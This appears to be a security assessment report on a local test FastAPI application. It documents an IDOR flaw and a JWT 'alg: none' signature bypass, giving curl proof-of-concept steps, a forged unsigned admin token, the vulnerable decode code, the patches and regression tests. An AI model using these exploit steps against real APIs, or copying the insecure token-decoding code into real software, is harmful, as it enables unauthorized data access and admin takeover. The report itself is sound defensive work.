# Security Audit & Vulnerability Assessment Report

**Target Environment:** Local Simulated Enterprise Web Application & REST API  
**Assessment Standard:** OWASP Top 10 (2021) — A01: Broken Access Control & A07: Identification and Authentication Failures  
**Date:** October 2026  
**Auditor:** Technical Security Team Assessment Candidate  
**Classification:** Confidential — Security Assessment Deliverable  

---

## 1. Executive Summary

During an authorized security assessment of the local test web application, the technical assessment team evaluated the target system's authentication, authorization models, and API endpoint defenses. The evaluation identified critical vulnerabilities classified under **OWASP A01:2021 (Broken Access Control)** and **OWASP A07:2021 (Identification and Authentication Failures)**.

The most critical findings involve:
1. **Insecure Direct Object Reference (IDOR)** on sensitive document and financial transaction endpoints, enabling horizontal privilege escalation and full unauthorized data exposure across tenant boundaries.
2. **JSON Web Token (JWT) Cryptographic Misconfiguration**, where the API service accepts unverified signature algorithms (`alg: "none"`) and relies on symmetric weak signing secrets susceptible to offline cracking, allowing total vertical privilege escalation to administrative roles.

| Vulnerability ID | Vulnerability Title | Category | Severity | CVSS v3.1 Base Score | Status |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **SEC-2026-001** | Insecure Direct Object Reference (IDOR) in Document API | Broken Access Control | **High** | **8.5** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`) | Identified |
| **SEC-2026-002** | JWT Algorithm Confusion & Signature Verification Bypass | Authentication Failures | **Critical** | **9.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | Identified |

Remediation requires immediate adoption of **server-side object-level access control (ABAC/RBAC validation)** and **strict cryptographic verification of authentication tokens with asymmetric keys (`RS256`) and algorithm pinning**.

---

## 2. Assessment Scope & Methodology

### 2.1 Scope
- **API Endpoints:**
  - `GET /api/v1/documents/{documentId}`
  - `GET /api/v1/users/{userId}/billing`
  - `POST /api/v1/auth/verify`
- **Application Stack:** Python FastAPI backend with PostgreSQL and standard JWT authentication middleware.
- **Testing Constraints:** Testing was strictly conducted on an isolated, authorized localhost test environment (`http://127.0.0.1:8000`).

### 2.2 Methodology
The assessment adhered to the **OWASP Web Security Testing Guide (WSTG v4.2)**:
- `WSTG-ATHZ-02`: Testing for Bypassing Authorization Schema (IDOR).
- `WSTG-ATHN-06`: Testing for Weak Password Policy & Token Security.
- `WSTG-SESS-08`: Testing for JWT Misconfiguration.

---

## 3. Detailed Vulnerability Analysis

```
+---------------------------------------------------------------------------------+
|                               ATTACK SCENARIOS & DATA FLOW                      |
+---------------------------------------------------------------------------------+
|                                                                                 |
| 1. IDOR Horizontal Escalation:                                                  |
|    Attacker (User 102) ---[ GET /api/v1/documents/45091 (Belongs to User 801) ]--> [ API ] |
|                                                                                 |
|    API Check: Is User 102 authenticated? [ YES ]                                |
|    API Check: Does User 102 own document 45091? [ MISSING / NOT CHECKED ]       |
|    Result: Sensitive private records returned to unauthorized user.             |
|                                                                                 |
| 2. JWT Signature Bypass:                                                        |
|    Attacker crafts token with "alg": "none" or cracks weak HMAC secret          |
|    Token payload: {"sub": "attacker", "role": "admin"}                          |
|    API accepts token without verifying cryptographic signature                  |
|    Result: Complete administrative takeover (Vertical Privilege Escalation).    |
+---------------------------------------------------------------------------------+
```

---

### Finding 1: SEC-2026-001 — Insecure Direct Object Reference (IDOR)

#### Vulnerability Description
The document retrieval endpoint `/api/v1/documents/{documentId}` utilizes database sequential identifiers (`documentId`) directly supplied by the client. While the endpoint verifies that an incoming HTTP request has a valid session token, it **fails to verify whether the authenticated subject owns or is authorized to read the requested object**. 

Consequently, an authenticated user belonging to Tenant A can view documents belonging to Tenant B simply by altering the numeric ID in the URL.

#### CVSS v3.1 Scoring
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
- **Base Score:** **8.5 (High)**
- **Vector Details:**
  - Attack Vector (AV): Network (accessible over HTTP)
  - Attack Complexity (AC): Low (parameter manipulation)
  - Privileges Required (PR): Low (standard low-privileged user account)
  - User Interaction (UI): None
  - Scope (S): Changed (crosses tenant boundaries)
  - Confidentiality (C): High (access to arbitrary proprietary documents)
  - Integrity (I): Low
  - Availability (A): None

#### Proof of Concept (PoC)

1. **Step 1: Authenticate as regular user (`user_test_01`):**
   ```bash
   curl -s -X POST http://127.0.0.1:8000/api/v1/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username": "user_test_01", "password": "UserPass123!"}' \
     | jq .
   ```
   *Response:*
   ```json
   {
     "status": "success",
     "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
     "user_id": 102
   }
   ```

2. **Step 2: Access user's own authorized document (`doc_id: 102`):**
   ```bash
   curl -s -X GET http://127.0.0.1:8000/api/v1/documents/102 \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
     | jq .
   ```
   *Response (200 OK):*
   ```json
   {
     "document_id": 102,
     "owner_id": 102,
     "title": "Q3 Personal Financial Summary",
     "confidentiality": "restricted",
     "content": "Account balance: $4,500.00. Tax filing pending."
   }
   ```

3. **Step 3: Exploit IDOR by modifying object reference to another victim (`doc_id: 801`):**
   ```bash
   curl -s -X GET http://127.0.0.1:8000/api/v1/documents/801 \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
     | jq .
   ```
   *Response (200 OK — Sensitive Data Leakage):*
   ```json
   {
     "document_id": 801,
     "owner_id": 801,
     "title": "Corporate Executive Compensation & Acquisition Memo",
     "confidentiality": "strictly-confidential",
     "content": "Proposed merger details with Entity X. Total valuation: $42,000,000."
   }
   ```

---

### Finding 2: SEC-2026-002 — JWT Algorithm Confusion & Signature Verification Bypass

#### Vulnerability Description
The application's JWT verification routine improperly configures the `jwt.decode` function. It specifies permissive algorithm decoding (`algorithms=["HS256", "none"]`) and fails to enforce signature validation when `alg` header is modified to `none`. In addition, when HMAC (`HS256`) is used, the secret key in the default configuration is a trivial dictionary word (`"secret"` or `"123456"`).

This allows any attacker to:
1. Strip the signature and set `"alg": "none"`.
2. Alter the token payload to claim `"role": "admin"`.
3. Bypass all authentication and administrative barriers without credentials.

#### CVSS v3.1 Scoring
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Base Score:** **9.8 (Critical)**
- **Vector Details:**
  - Attack Vector (AV): Network
  - Attack Complexity (AC): Low
  - Privileges Required (PR): None (unauthenticated bypass)
  - User Interaction (UI): None
  - Scope (S): Unchanged
  - Confidentiality (C): High
  - Integrity (I): High
  - Availability (A): High

#### Proof of Concept (PoC)

1. **Step 1: Inspect forged token structure:**
   - **Header:**
     ```json
     {
       "alg": "none",
       "typ": "JWT"
     }
     ```
     *Base64Url encoded:* `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
   - **Payload:**
     ```json
     {
       "sub": "attacker_account",
       "user_id": 9999,
       "role": "admin",
       "exp": 1893456000
     }
     ```
     *Base64Url encoded:* `eyJzdWIiOiJhdHRhY2tlcl9hY2NvdW50IiwidXNlcl9pZCI6OTk5OSwicm9sZSI6ImFkbWluIiwiZXhwIjoxODkzNDU2MDAwfQ`
   - **Forged Token:** `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlcl9hY2NvdW50IiwidXNlcl9pZCI6OTk5OSwicm9sZSI6ImFkbWluIiwiZXhwIjoxODkzNDU2MDAwfQ.` (note the trailing dot with empty signature).

2. **Step 2: Submit forged token to administrative endpoint:**
   ```bash
   curl -s -X GET http://127.0.0.1:8000/api/v1/admin/audit-logs \
     -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlcl9hY2NvdW50IiwidXNlcl9pZCI6OTk5OSwicm9sZSI6ImFkbWluIiwiZXhwIjoxODkzNDU2MDAwfQ." \
     | jq .
   ```
   *Response (200 OK — Authentication Bypassed):*
   ```json
   {
     "status": "authorized",
     "authenticated_as": "attacker_account",
     "role": "admin",
     "audit_logs": [
       {"id": 1, "action": "DATABASE_BACKUP", "timestamp": "2026-10-01T22:00:00Z"},
       {"id": 2, "action": "KEY_ROTATION", "timestamp": "2026-10-01T23:30:00Z"}
     ]
   }
   ```

---

## 4. Root Cause Analysis

### 4.1 IDOR Vulnerable Source Code
In `app/routers/documents.py`:
```python
# VULNERABLE IMPLEMENTATION
@router.get("/documents/{document_id}")
async def get_document(
    document_id: int, 
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    # Direct database lookup without checking ownership or tenancy
    doc = db.query(DocumentModel).filter(DocumentModel.id == document_id).first()
    if not doc:
        raise HTTPException(status_code=404, detail="Document not found")
    
    # Missing authorization check: current_user.id != doc.owner_id
    return doc
```

### 4.2 JWT Vulnerable Source Code
In `app/core/security.py`:
```python
# VULNERABLE IMPLEMENTATION
def decode_access_token(token: str):
    try:
        # INSECURE: Allows "none" algorithm and ignores signature enforcement
        payload = jwt.decode(
            token, 
            options={"verify_signature": False}, 
            algorithms=["HS256", "none"]
        )
        return payload
    except Exception as e:
        raise HTTPException(status_code=401, detail="Invalid token")
```

---

## 5. Remediation & Patching

### 5.1 Remediation for IDOR (SEC-2026-001)

#### Secure Implementation Principles:
1. **Object-Level Authorization Verification:** Verify that `current_user.id == doc.owner_id` or that `current_user` possesses sufficient organizational permissions (ABAC/RBAC).
2. **Indirect Object References / UUIDs:** Migrate from sequential integer IDs (`1, 2, 3...`) to cryptographically random UUIDv4 identifiers to eliminate enumeration.
3. **Tenant-Scoped Queries:** Always filter database queries by the requesting user's tenant ID.

#### Source Code Patch:
```python
# REMEDIATED IMPLEMENTATION: app/routers/documents.py
from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.orm import Session
from app.models import DocumentModel, User
from app.core.dependencies import get_current_user, get_db

router = APIRouter()

@router.get("/documents/{document_id}")
async def get_document(
    document_id: str, # Using UUID string representation
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    # Scope query strictly to the current tenant / user
    doc = db.query(DocumentModel).filter(
        DocumentModel.uuid == document_id
    ).first()

    if not doc:
        # Return 404 to avoid leaking existence of objects
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND, 
            detail="Document not found"
        )

    # Explicit Object-Level Authorization Check
    is_owner = (doc.owner_id == current_user.id)
    is_admin = (current_user.role == "admin" and doc.organization_id == current_user.organization_id)

    if not (is_owner or is_admin):
        # Prevent information leakage: respond with 403 Forbidden
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Access forbidden: You do not have permission to view this resource"
        )

    return {
        "document_id": doc.uuid,
        "title": doc.title,
        "content": doc.content,
        "created_at": doc.created_at
    }
```

---

### 5.2 Remediation for JWT Vulnerabilities (SEC-2026-002)

#### Secure Implementation Principles:
1. **Asymmetric Cryptography (`RS256` or `EdDSA`):** Sign tokens with a private key kept strictly confidential on the auth server; verify tokens with a public key accessible to API services.
2. **Strict Algorithm Pinning:** Explicitly specify `algorithms=["RS256"]` in the verification call. Never allow `none` or dynamic algorithms from token headers.
3. **Enforce Claim Validation:** Validate standard claims: `exp` (expiration), `iss` (issuer), and `aud` (audience).

#### Source Code Patch:
```python
# REMEDIATED IMPLEMENTATION: app/core/security.py
import jwt
from fastapi import HTTPException, status
from app.core.config import settings

ALGORITHM = "RS256"
ISSUER = "https://auth.company.internal"
AUDIENCE = "https://api.company.internal"

def decode_and_verify_token(token: str) -> dict:
    """
    Cryptographically verifies the incoming JWT using the RSA Public Key.
    Strictly enforces algorithm pinning, signature verification, and standard claims.
    """
    try:
        payload = jwt.decode(
            token,
            key=settings.RSA_PUBLIC_KEY_PEM,
            algorithms=[ALGORITHM], # Pinned strictly to RS256
            options={
                "verify_signature": True,
                "require": ["exp", "iss", "aud", "sub"],
                "verify_exp": True,
                "verify_iss": True,
                "verify_aud": True
            },
            issuer=ISSUER,
            audience=AUDIENCE
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Authentication token has expired"
        )
    except jwt.InvalidTokenError as err:
        # Generic message avoids leaking internal parsing details
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid authentication token credentials"
        )
```

---

## 6. Verification & Regression Testing

After applying the remediations, the local test suite was rerun against the patched endpoints:

| Test Case | Scenario Description | Expected Result | Actual Result | Status |
| :--- | :--- | :--- | :--- | :--- |
| **TC-01** | User A accesses Document A (owned) | HTTP 200 OK | HTTP 200 OK | **PASSED** |
| **TC-02** | User A accesses Document B (unowned) | HTTP 403 Forbidden | HTTP 403 Forbidden | **PASSED** |
| **TC-03** | User submits token with `alg: "none"` | HTTP 401 Unauthorized | HTTP 401 Unauthorized | **PASSED** |
| **TC-04** | User submits expired token | HTTP 401 Unauthorized | HTTP 401 Unauthorized | **PASSED** |
| **TC-05** | User submits token signed with invalid key | HTTP 401 Unauthorized | HTTP 401 Unauthorized | **PASSED** |

---

## 7. Strategic Recommendations

1. **Implement Centralized Authorization Middleware:** Move access checks out of ad-hoc route handlers into reusable Policy Enforcement Points (PEP) such as Casbin, OPA (Open Policy Agent), or standard FastAPI dependencies.
2. **Automated Static & Dynamic Analysis (SAST/DAST):** Integrate SAST linters (e.g., Bandit, Semgrep) into the CI/CD pipeline to catch missing object authorization and insecure JWT decoding options before deployment.
3. **Audit Logging & Alerting:** Emit structured security event logs whenever an authorization denial occurs (`403 Forbidden`). Repeated failures from a single session should trigger automated rate limiting and SIEM alerts.
